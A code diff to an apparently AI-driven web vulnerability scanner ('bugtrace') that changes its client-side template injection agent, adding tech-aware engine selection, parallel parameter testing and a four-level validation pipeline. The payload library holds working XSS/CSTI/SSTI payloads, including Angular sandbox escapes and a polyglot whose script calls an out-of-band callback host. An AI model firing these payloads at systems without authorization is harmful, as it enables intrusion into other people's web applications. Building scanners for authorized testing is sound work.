@@ -18,6 +18,9 @@ from dataclasses import dataclass, field
 from bugtrace.schemas.validation_feedback import ValidationFeedback, FailureReason
 from bugtrace.core.validation_status import ValidationStatus, requires_cdp_validation
 
+# v2.1.0: Import specialist utilities for payload loading from JSON (if needed)
+from bugtrace.agents.specialist_utils import load_full_payload_from_json, load_full_finding_data
+
 @dataclass
 class CSTIFinding:
     """
@@ -134,6 +137,8 @@ PAYLOAD_LIBRARY = {
     # UNIVERSAL ARITHMETIC PROBES (work on most engines)
     # ================================================================
     "universal": [
+        # THE OMNI-PROBE (User Inspired): XSS + CSTI + SSTI Polyglot
+        "'\"><script id=bt-pwn>fetch('https://{{interactsh_url}}')</script>{{7*7}}${7*7}<% 7*7 %>",
         "{{7*7}}",
         "${7*7}",
         "<%= 7*7 %>",
@@ -161,9 +166,9 @@ PAYLOAD_LIBRARY = {
         "{{a]}}",
         "{{'a]'}}",
         # Sandbox bypasses (Angular 1.x - ginandjuice.shop uses older Angular)
-        "{{x = {'y':''.constructor.prototype}; x['y'].charAt=[].join;$eval('x=alert(1)');}}",
-        "{{'a]'.constructor.prototype.charAt=[].join;$eval('x=alert(1)');}}",
-        "{{toString.constructor.prototype.toString=toString.constructor.prototype.call;[\"a\",\"alert(1)\"].sort(toString.constructor);}}",
+        "{{x = {'y':''.constructor.prototype}; x['y'].charAt=[].join;$eval('x=alert(document.domain)');}}",
+        "{{'a]'.constructor.prototype.charAt=[].join;$eval('x=alert(document.domain)');}}",
+        "{{toString.constructor.prototype.toString=toString.constructor.prototype.call;[\"a\",\"alert(document.domain)\"].sort(toString.constructor);}}",
         # More sandbox bypasses for different Angular versions
         "{{$eval.constructor('return 7*7')()}}",
         "{{$parse.constructor('return 7*7')()}}",
@@ -342,6 +347,10 @@ class CSTIAgent(BaseAgent):
         self.interactsh_url = None
         self._max_impact_achieved = False
 
+        # Load technology profile for framework-specific CSTI attacks
+        from bugtrace.utils.tech_loader import load_tech_profile
+        self.tech_profile = load_tech_profile(self.report_dir)
+
         # Queue consumption mode (Phase 20)
         self._queue_mode = False
         self._worker_pool: Optional[WorkerPool] = None
@@ -467,11 +476,30 @@ class CSTIAgent(BaseAgent):
             return ""
 
     async def _targeted_probe(self, session, param, engines) -> Optional[Dict]:
-        """Probe using payloads specific to detected engines."""
-        for engine in engines:
+        """
+        Probe using payloads specific to detected engines.
+
+        Tech-aware: Prioritizes engines detected by Nuclei in tech_profile.
+        """
+        # Enhance engine detection with tech_profile data
+        tech_engines = []
+        if self.tech_profile and self.tech_profile.get("frameworks"):
+            for framework in self.tech_profile["frameworks"]:
+                fw_lower = framework.lower()
+                if "angular" in fw_lower:
+                    tech_engines.append("angular")
+                    logger.info(f"[{self.name}] Tech-aware: Prioritizing Angular CSTI (detected: {framework})")
+                elif "vue" in fw_lower:
+                    tech_engines.append("vue")
+                    logger.info(f"[{self.name}] Tech-aware: Prioritizing Vue CSTI (detected: {framework})")
+
+        # Merge: tech_engines first, then regular detected engines
+        prioritized_engines = list(dict.fromkeys(tech_engines + engines))  # Deduplicate while preserving order
+
+        for engine in prioritized_engines:
             payloads = PAYLOAD_LIBRARY.get(engine, [])
             payloads = await self._get_encoded_payloads(payloads)
-            
+
             for p in payloads:
                 dashboard.set_current_payload(p, f"CSTI:{param}", f"Targeted ({engine})")
                 content, verified_url = await self._test_payload(session, param, p)
@@ -849,7 +877,15 @@ Response format (XML):
 
         param_findings = []
         engines = TemplateEngineFingerprinter.fingerprint(html)
-        logger.info(f"[{self.name}] Detected engines: {engines}")
+        
+        # COST OPTIMIZATION (2026-02-01): Check reflection before LLM
+        # If it's a client-side engine (Angular/Vue) and not reflected, LLM is likely a waste
+        is_client_side = any(e in ["angular", "vue"] for e in engines)
+        if is_client_side:
+            is_reflected = await self._check_light_reflection(session, param)
+            if not is_reflected:
+                logger.debug(f"[{self.name}] Param '{param}' not reflected, skipping LLM for cost saving.")
+                return []
 
         # Phase 1: LLM Smart Analysis
         if engines != ["unknown"]:
@@ -915,17 +951,21 @@ Response format (XML):
         """Prepare for template injection scan.
 
         IMPROVED (2026-01-30): Auto-discover params from URL and HTML.
+        FIXED (2026-02-01): URL query params are FIRST-CLASS citizens (before provided params).
         """
-        # CRITICAL: Auto-discover params if none provided or incomplete
+        # CRITICAL: Auto-discover params from URL (first-class citizens)
         discovered_params = self._discover_all_params()
 
-        # Merge with any params passed in
-        existing_param_names = {p.get("parameter") for p in self.params}
-        for dp in discovered_params:
-            if dp.get("parameter") not in existing_param_names:
-                self.params.append(dp)
+        # FIXED: URL query params come FIRST, then merge with provided params
+        discovered_names = {p.get("parameter") for p in discovered_params}
 
-        self.params = self._prioritize_params(self.params)
+        # Add provided params that aren't already discovered
+        for p in self.params:
+            if p.get("parameter") not in discovered_names:
+                discovered_params.append(p)
+
+        # URL query params are now first-class (tested first)
+        self.params = self._prioritize_params(discovered_params)
 
         # Log what we're testing
         param_names = [p.get("parameter") for p in self.params]
@@ -938,31 +978,29 @@ Response format (XML):
     def _discover_all_params(self) -> List[Dict]:
         """
         ADDED (2026-01-30): Auto-discover ALL testable parameters.
+        IMPROVED (2026-02-01): URL query params are first-class citizens (no path filtering).
 
         Sources:
-        1. URL query string params
-        2. Common vulnerable param names
+        1. URL query string params (ALWAYS - first-class)
+        2. Common vulnerable param names (ALWAYS - for comprehensive coverage)
         """
         discovered = []
 
-        # 1. Extract from URL query string
+        # 1. Extract from URL query string (ALWAYS - first-class citizens)
         parsed = urlparse(self.url)
         query_params = parse_qs(parsed.query)
         for param_name in query_params.keys():
             discovered.append({"parameter": param_name, "source": "url_query"})
-            logger.debug(f"[{self.name}] Discovered param from URL: {param_name}")
+            logger.info(f"[{self.name}] 🎯 URL Query Param (first-class): {param_name}")
 
-        # 2. Add common vulnerable params if URL has a path that suggests templates
-        # (e.g., /catalog, /blog, /search)
-        path_lower = parsed.path.lower()
-        template_paths = ["/catalog", "/blog", "/search", "/template", "/render", "/preview"]
-        if any(tp in path_lower for tp in template_paths):
-            common_vuln_params = ["category", "search", "q", "query", "filter", "sort",
-                                  "template", "view", "page", "lang", "theme"]
-            for param in common_vuln_params:
-                if param not in query_params:
-                    discovered.append({"parameter": param, "source": "common_vuln"})
-                    logger.debug(f"[{self.name}] Added common vuln param: {param}")
+        # 2. ALWAYS add common vulnerable params for comprehensive coverage
+        # FIXED (2026-02-01): Removed path filtering - Burp tests these on ALL endpoints
+        common_vuln_params = ["category", "search", "q", "query", "filter", "sort",
+                              "template", "view", "page", "lang", "theme", "type", "action"]
+        for param in common_vuln_params:
+            if param not in query_params:
+                discovered.append({"parameter": param, "source": "common_vuln"})
+                logger.debug(f"[{self.name}] Added common vuln param: {param}")
 
         return discovered
 
@@ -976,16 +1014,138 @@ Response format (XML):
         return all_findings
 
     async def _test_all_params(self, session, html: str) -> List[Dict]:
-        """Test all parameters with session and HTML."""
+        """Test all parameters with session and HTML (Parallel Mode)."""
         all_findings = []
-        for item in self.params:
-            if self._max_impact_achieved:
-                dashboard.log(f"[{self.name}] 🏆 Max impact achieved, skipping remaining params", "SUCCESS")
-                break
+        
+        # Parallel optimization: Process up to 5 parameters concurrently
+        semaphore = asyncio.Semaphore(5)
+        
+        async def _worker(item):
+            async with semaphore:
+                if self._max_impact_achieved:
+                    return []
+                return await self._test_parameter(session, item, html)
 
-            param_findings = await self._test_parameter(session, item, html)
-            all_findings.extend(param_findings)
+        tasks = [_worker(item) for item in self.params]
+        results = await asyncio.gather(*tasks)
+        
+        for r in results:
+            all_findings.extend(r)
+            
         return all_findings
+
+    async def _validate(
+        self,
+        param: str,
+        payload: str,
+        response_html: str,
+        screenshots_dir: Path
+    ) -> tuple:
+        """
+        4-LEVEL VALIDATION PIPELINE (V2.0) - CSTI/SSTI Alignment
+        Ref: BugTraceAI-CLI/docs/architecture/xss-validation-pipeline.md
+        """
+        evidence = {"payload": payload}
+
+        # Level 1: HTTP Static Reflection Check (Arithmetic/Signatures)
+        if await self._validate_http_reflection(param, payload, response_html, evidence):
+            return True, evidence
+
+        # Level 2: AI-Powered Manipulator (Logic Evasion)
+        if await self._validate_with_ai_manipulator(param, payload, response_html, evidence):
+            return True, evidence
+
+        # Level 3: Playwright Browser Execution (Client-side engines)
+        if await self._validate_with_playwright(param, payload, screenshots_dir, evidence):
+            return True, evidence
+
+        # Level 4: Escalation (Return False to let Manager/Reactor escalate to AgenticValidator)
+        logger.debug(f"[{self.name}] L1-L3 inconclusive, escalation to L4 (AgenticValidator) required")
+        return False, evidence
+
+    async def _validate_http_reflection(self, param: str, payload: str, response_html: str, evidence: Dict) -> bool:
+        """Level 1: Fast HTTP static evaluation check."""
+        # Tier 1.1: OOB Interactsh (Definitive OOB)
+        if await self._check_oob_hit(f"csti_{param}"):
+            evidence["method"] = "L1: OOB Interactsh"
+            evidence["level"] = 1
+            return True
+
+        if not response_html:
+            return False
+
+        # Tier 1.2: Signatures and Arithmetic
+        # Use existing checks
+        async with http_manager.isolated_session(ConnectionProfile.FAST) as session:
+            if await self._check_arithmetic_evaluation(response_html, payload, session, ""):
+                evidence["method"] = "L1: Arithmetic Evaluation"
+                evidence["level"] = 1
+                evidence["status"] = "VALIDATED_CONFIRMED"
+                return True
+
+        if self._check_string_multiplication(response_html, payload):
+            evidence["method"] = "L1: String Multiplication"
+            evidence["level"] = 1
+            evidence["status"] = "VALIDATED_CONFIRMED"
+            return True
+
+        if self._check_config_reflection(response_html, payload):
+            evidence["method"] = "L1: Config Reflection"
+            evidence["level"] = 1
+            evidence["status"] = "VALIDATED_CONFIRMED"
+            return True
+
+        if self._check_engine_signatures(response_html, payload):
+            evidence["method"] = "L1: Engine Signature"
+            evidence["level"] = 1
+            evidence["status"] = "VALIDATED_CONFIRMED"
+            return True
+
+        if self._check_error_signatures(response_html):
+            evidence["method"] = "L1: Error Signature"
+            evidence["level"] = 1
+            evidence["status"] = "VALIDATED_CONFIRMED"
+            return True
+
+        return False
+
+    async def _validate_with_ai_manipulator(self, param: str, payload: str, response_html: str, evidence: Dict) -> bool:
+        """Level 2: AI-powered audit of potential evaluation."""
+        if not response_html or payload not in response_html:
+            return False
+            
+        # If the exact payload is reflected, maybe it's partially evaluated but masked?
+        # Or maybe it's a context where simple arithmetic fails but more complex objects work.
+        # Placeholder for AI analysis
+        return False
+
+    async def _validate_with_playwright(self, param: str, payload: str, screenshots_dir: Path, evidence: Dict) -> bool:
+        """Level 3: Playwright browser execution (Client-side engines like Angular)."""
+        attack_url = self._inject(param, payload)
+        
+        # Use verifier pool for efficiency
+        from bugtrace.agents.agentic_validator import _verifier_pool
+        verifier = await _verifier_pool.get_verifier()
+        try:
+            result = await verifier.verify_xss(
+                url=attack_url,
+                screenshot_dir=str(screenshots_dir),
+                timeout=8.0,
+                max_level=3 # Stay at L3 within the agent
+            )
+
+            if result.success:
+                evidence.update(result.details or {})
+                evidence["playwright_confirmed"] = True
+                evidence["screenshot_path"] = result.screenshot_path
+                evidence["method"] = "L3: Playwright Browser"
+                evidence["level"] = 3
+                evidence["status"] = "VALIDATED_CONFIRMED"
+                return True
+        finally:
+            _verifier_pool.release()
+
+        return False
 
     async def _cleanup_scan(self):
         """Cleanup after template injection scan."""
@@ -1001,36 +1161,46 @@ Response format (XML):
             logger.debug(f"_get_baseline_content failed: {e}")
             return ""
 
+    async def _check_light_reflection(self, session, param: str) -> bool:
+        """Quick check if a parameter is reflected at all to avoid wasting LLM costs."""
+        probe = "BT7331"
+        try:
+            content, _ = await self._test_payload(session, param, probe)
+            return probe in (content or "")
+        except Exception:
+            return False
+
     async def _test_payload(self, session, param, payload) -> Tuple[Optional[str], Optional[str]]:
         """
-        Injects payload and returns (content, effective_url) if evaluated, (None, None) otherwise.
-        Performs strict verification including baseline checks.
+        Injects payload and performs 4-level validation.
+        Returns (content, effective_url) if validated (L1-L3), or triggers escalation (L4).
         """
         target_url = self._inject(param, payload)
-
+        
+        # Level 1-2 Check (HTTP)
         try:
             async with session.get(target_url, timeout=5) as resp:
                 content = await resp.text()
                 final_url = str(resp.url)
-
-                # Check all detection methods
-                if await self._check_arithmetic_evaluation(content, payload, session, final_url):
+                
+                validated, evidence = await self._validate(param, payload, content, Path(settings.LOG_DIR))
+                if validated:
+                    # L1-L3 confirmed it
                     return content, final_url
-
-                if self._check_string_multiplication(content, payload):
-                    return content, final_url
-
-                if self._check_config_reflection(content, payload):
-                    return content, final_url
-
-                if self._check_engine_signatures(content, payload):
-                    return content, final_url
-
-                if self._check_error_signatures(content):
+                
+                # If L3 failed but it might be L4 (CDP required), we still report it as a potential finding
+                # but with PENDING_VALIDATION status if escalate=True.
+                # However, CSTIAgent currently returns findings in a flat list.
+                # To align with Reactor, any inconclusive result from _validate should be escalated.
+                if not validated and "status" not in evidence:
+                    # It's an escalation case (L4)
+                    logger.info(f"[{self.name}] CSTI L1-L3 inconclusive for {payload[:30]}, escalating to L4")
+                    # We return the content anyway to let the caller know SOMETHING interesting happened (reflection)
                     return content, final_url
 
         except Exception as e:
             logger.debug(f"CSTI test error: {e}")
+            
         return None, None
 
     async def _check_arithmetic_evaluation(self, content: str, payload: str, session, final_url: str) -> bool:
@@ -1576,6 +1746,14 @@ Response format (XML):
         if result is None:
             return
 
+        # Use centralized validation status for proper tagging
+        # Client-side CSTI (Angular, Vue) may need browser validation
+        finding_data = {
+            "context": result.engine_type,
+            "payload": result.payload,
+            "validation_method": result.template_engine,
+            "evidence": result.evidence,
+        }
         # Use centralized validation status for proper tagging
         # Client-side CSTI (Angular, Vue) may need browser validation
         finding_data = {
